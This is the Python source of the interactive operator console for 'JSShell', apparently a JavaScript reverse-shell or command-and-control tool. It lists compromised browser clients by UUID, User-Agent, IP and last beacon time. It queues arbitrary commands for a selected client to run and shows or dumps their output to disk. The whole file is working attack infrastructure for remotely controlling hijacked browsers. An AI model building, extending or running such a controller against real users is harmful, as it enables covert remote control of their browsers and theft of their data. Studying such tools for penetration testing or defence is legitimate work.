from app import db
from app.models import Client, Command
from prettytable import PrettyTable
from time import sleep
from jsbeautifier import beautify
import shutil
from pygments import highlight, lexers, formatters
from app.utils import More, Colors


class InteractiveShell(object):
    """ An interactive shell for the JSShell Project """

    def __init__(self):
        self.stay = True
        self.prompt = self.format_prompt()
        self.current_client_id = 0

    def error(self, text):
        """ Error print statement """
        print('{colors.bold}{colors.fg.red}Error:{colors.reset}'.format(colors=Colors),text)

    def format_prompt(self, _id=None):
        """ Formats the prompt string """
        if _id:
            return '{colors.underline}{colors.fg.cyan}(Client {}){colors.reset} >> '.format(_id, colors=Colors)
        else:
            return '>> '

    def client_required(foo):
        """ A Decorator to determine whether a client is currently selected or not. """
        def wrap(self, *args, **kwargs):
            if self.current_client_id and Client.query.filter_by(id=self.current_client_id):
                foo(self, *args, **kwargs)
            else:
                self.error('Client is required for this function.')
        return wrap

    def list_clients(self):
        """ Lists all the clients available """

        t = PrettyTable(['#', 'UUID', 'User-Agent', 'IP', 'Last Beacon'])
        t.align = 'l'

        avail_length = Client.get_available_screen_for_user_agent()

        for c in Client.query.all():
            ua_printed = c.user_agent

            if len(ua_printed) >= avail_length:
                ua_printed = ua_printed[:avail_length - 3] + '...'

            t.add_row([c.id, c.client_id, ua_printed, c.ip, c.last_beaconed])

        print(t)

    def help_menu(self):
        """ Prints a pretty help menu """
        t = PrettyTable(['command', 'description'])
        t.align = 'l'

        t.add_row(['list', 'Lists all the clients registered'])
        t.add_row(['help', 'self.help()'])
        t.add_row(['select <id>', 'Selected a specific client from the list'])
        t.add_row(['info <id>', 'Prints information on a specific client'])
        t.add_row(['<command>', 'Executes a command to the current selected client'])
        t.add_row(['back', 'Detaches from the current client'])
        t.add_row(['exit', 'Exists this interactive shell'])
        t.add_row(['coms', 'Displays the commands and output for the current client'])
        t.add_row(['com <id>', 'Displays a specific command and output'])
        t.add_row(['more <id>', 'Displays a specific command and output (with pagination)'])
        t.add_row(['comk', 'Kills a command ("*" for all)'])
        t.add_row(['clik', 'Kills a client ("*" for all)'])
        t.add_row(['dump <id>', 'Dumps the command output to disk - "dump.txt"'])

        print(t)

    def select_client(self, selected_id):
        """ Selected a client by ID """

        if not selected_id.isdigit():
            self.error('Selected ID must be an integer from the list.')
            return

        i = int(selected_id)
        client = Client.query.filter_by(id=i).first()
        if not client:
            self.error('Selected ID does not exists.')
            return

        self.prompt = self.format_prompt(i)
        self.current_client_id = i

    def back(self):
        """ Detaches from a client """

        self.prompt = self.format_prompt()
        self.current_client_id = 0

    @client_required
    def execute_command(self, cmd):
        """ Executes a command on a client """

        client = Client.query.filter_by(id=self.current_client_id).first()
        c = Command(cmd)
        client.commands.append(c)
        db.session.add(c)
        db.session.commit()
        print('{colors.italics}{colors.fg.lightgrey}Added task successfully.{colors.reset}'.format(colors=Colors))


    @client_required
    def display_commands(self, com_id=None, more=False):
        """ Displays all the commands executed on a client """

        if com_id:
            client = Client.query.filter_by(id=self.current_client_id).first()

            if not com_id in [str(i.id) for i in client.commands]:
                self.error('Selected client does not have this command ID.')
                return

            com = Command.query.filter_by(id=com_id).first()

            command_string = beautify(com.cmd)
            output_string = beautify(com.output)

            colorful_json = highlight(output_string, lexers.JsonLexer(), formatters.TerminalFormatter())

            full_command_string = '{colors.underline}{colors.fg.yellow}(Command {command_id}):' \
                                  '{colors.reset} \n{command_string}'.format(
                command_id=com.id,
                command_string=command_string,
                colors=Colors)

            full_output_string = '{colors.underline}{colors.fg.yellow}(Output  {command_id}):' \
                                 '{colors.reset} \n{output_string}'.format(
                command_id=com.id,
                output_string=colorful_json,
                colors=Colors)

            if more:
                more = More()
                full_command_string| more
                full_output_string | more
            else:
                print(full_command_string)
                print(full_output_string)

            return

        t = PrettyTable(['ID', 'Status', 'Command', 'Output'])
        t.align = 'l'
        client = Client.query.filter_by(id=self.current_client_id).first()

        for com in client.commands:
            command, output = com.cmd,com.output
            if len(com.output) > 75:
                output = com.output[:73] + '...'

            if len(com.cmd) > 75:
                command = com.cmd[:73] + '...'

            status = "{colors.fg.blue}waiting{colors.reset}".format(colors=Colors)

            if com.is_served:
                status = "{colors.fg.yellow}served{colors.reset}".format(colors=Colors)

            if com.is_returned:
                status = "{colors.fg.green}complete{colors.reset}".format(colors=Colors)

            t.add_row([com.id, status, command, output])

        print(t)

    @client_required
    def command_kill(self, command_id):
        """ Kills a specific command for a client and removes it from the DB """

        if command_id == '*':
            Command.query.filter_by(rel_client_id=self.current_client_id).delete()
        else:
            Command.query.filter_by(id=command_id).delete()
        db.session.commit()

    def client_kill(self, client_id):
        """ Kills a specific client and removes it from the DB """

        if client_id == '*':
            Client.query.delete()
        else:
            Client.query.filter_by(id=client_id).delete()
        db.session.commit()


    @client_required
    def com_dump(self, command_id):
        """ Copies a command output to clipboard """
        c = Command.query.filter_by(rel_client_id=self.current_client_id, id=command_id).first()

        with open('dump.txt', 'w') as f:
            f.write(beautify(str(c.output.encode('utf-8', 'ignore'))))

        print('Command {} was dumped to "dump.txt"'.format(command_id))

    def client_info(self, client_id):
        """ Copies a command output to clipboard """
        client = Client.query.filter_by(id=client_id).first()

        if not client:
            self.error('Client does not exist.')
            return

        print('{colors.underline}Client Information:{colors.reset}'.format(colors=Colors))

        print('{colors.bold}ID{colors.reset}            : {client.client_id}'.format(colors=Colors, client=client))
        print('{colors.bold}User-Agent{colors.reset}    : {client.user_agent}'.format(colors=Colors, client=client))
        print('{colors.bold}IPv4{colors.reset}          : {client.ip}'.format(colors=Colors, client=client))
        print('{colors.bold}Last Beaconed{colors.reset} : {client.last_beaconed}, {lbd} ago'.format(
            colors=Colors,
            client=client,
            lbd=client.last_beacon_delta()))
        print('{colors.bold}Num of Coms{colors.reset}   : {number}'.format(colors=Colors, number=client.number_of_commands()))

    def welcome(self):
        try:
            print("""
        {colors.fg.blue} ╦╔═╗{colors.reset}╔═╗┬ ┬┌─┐┬  ┬
        {colors.fg.blue} ║╚═╗{colors.reset}╚═╗├─┤├┤ │  │
        {colors.fg.blue}╚╝╚═╝{colors.reset}╚═╝┴ ┴└─┘┴─┘┴─┘
         {colors.fg.lightcyan}By{colors.reset} {colors.fg.cyan}{colors.bold}@Daniel_Abeles{colors.reset}
               """.format(colors=Colors))
        except:
            print("""\n  JSShell - by @Daniel_Abeles\n""")

    def loop(self):
        """ The main loop for the class """

        self.welcome()

        while self.stay:
            op, _, tail = input(self.prompt).strip().partition(' ')

            if op == 'exit':
                print('Goodbye!')
                self.stay = False

            elif op == 'help':
                self.help_menu()

            elif op == 'list':
                self.list_clients()

            elif op == 'select':
                self.select_client(tail)

            elif op == 'back':
                self.back()

            elif op == 'com':
                self.display_commands(tail)

            elif op == 'more':
                self.display_commands(tail, more=True)

            elif op == 'coms':
                self.display_commands()

            elif op == 'comk':
                self.command_kill(tail)

            elif op == 'clik':
                self.client_kill(tail)

            elif op == 'dump':
                self.com_dump(tail)

            elif op == 'info':
                self.client_info(tail)

            elif op == '':
                continue

            else:
                self.execute_command(' '.join([op, tail]))


if __name__ == "__main__":

    ints = InteractiveShell()
    ints.loop()
